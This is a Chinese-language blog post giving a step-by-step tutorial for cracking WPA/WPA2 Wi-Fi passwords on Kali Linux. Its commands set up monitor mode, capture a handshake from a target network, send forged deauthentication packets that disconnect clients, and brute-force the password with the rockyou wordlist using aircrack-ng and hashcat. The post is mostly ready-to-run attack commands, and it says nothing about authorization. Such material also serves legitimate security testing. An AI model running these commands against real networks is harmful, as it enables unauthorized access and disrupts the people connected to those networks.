---
title: wlan密码安全测试
date: 2022-01-31 15:38:06
---

## 环境
1. Kali Linux（推荐），该系统预装了用到的所有工具，或者其它基于debian的GUN/Linux也是可以的，需要手动安装[Aircrack-ng](http://aircrack-ng.org/),`sudo apt-get install aircrack-ng`
>为了方便可以将系统安装到优盘（[安装文档](https://www.kali.org/docs/usb/live-usb-install-with-windows/)），奇怪的是，使用官方推荐的工具[etcher](https://github.com/balena-io/etcher/releases)、[rufus](https://rufus.ie/zh/)制作的优盘，在UEFI+GPT方式的引导下并没有成功进入系统，后来使用了Win32DiskImager并关闭了BIOS的安全启动才成功进入系统。
**注意：**使用Win32DiskImager制作启动盘会对优盘的容量有折损，建议使用闲置的优盘。

2. 一个支持[监听模式](https://en.wikipedia.org/wiki/Monitor_mode)的无线网卡（一般笔记本自带的就可以），台式机的话可以买个外置无线网卡，[支持的设备](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html)

## 渗透过程
### 开启网卡监听
```
# 列出支持Monitor_mode的接口
airmon-ng
# 开启网卡监听模式
airmon-ng start wlan0
# 查看处于监听的接口
iwconfig
```

### 扫描你要破解的网络

```
airodump-ng wlan0mon
```
`ctrl+c`退出扫描，记下你要破解无线的BSSID MAC地址和channel，后面会用到


### 捕获握手包

WAP/WAP2是用[4-way handshake](https://security.stackexchange.com/questions/17767/four-way-handshake-in-wpa-personal-wpa-psk)验证网络设备的，我们需要捕获到其中的一次握手来破解密码。
```
# replace -c and --bssid values with the values of your target network
# -w specifies the directory where we will save the packet capture
airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w handshake mon0
```
当屏幕上出现类似`[ WPA handshake: bc:d3:c9:ef:d2:67`的字符串时，说明捕获成功，此时会在当前目录下生成handshake-01.cap文件，我们需要这个文件进行破解。
>此方式需要等有设备连接时才会捕获到握手包，但是我们可以通过以下方式，来促使这一过程的完成

### Deauth Attack
可以伪造一个forged deauthentication packets取消验证的数据包发给终端。
```
# -0 2 specifies we would like to send 2 deauth packets. Increase this number
# if need be with the risk of noticeably interrupting client network activity
# -a is the MAC of the access point
# -c is the MAC of the client
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

# not all clients respect broadcast deauths though
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
```

### 解密

```
# download the 134MB rockyou dictionary file
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
# -a2 specifies WPA2, -b is the BSSID, -w is the wordfile
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap
```
等待出现`KEY FOUND!`时，则成功解密

### hashcat解密
hashcat是世界上最快，最先进的密码恢复实用程序，支持五种独特的攻击模式，适用于300多种高度优化的哈希算法。hashcat 目前在 Linux、Windows 和 macOS 上支持 CPU、GPU 和其他硬件加速器，并具有帮助启用分布式密码破解的功能。

* 通过[cap2hccapx](https://hashcat.net/cap2hccapx/)将cap文件转化为hashcat需要的格式
* 通过[example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes),搜索wap加密的Hash-Mode

```
# -m 指定hash-mode -a 指定攻击模式
hashcat -m 22000 -a 0 ${破解文件} ${字典}
```

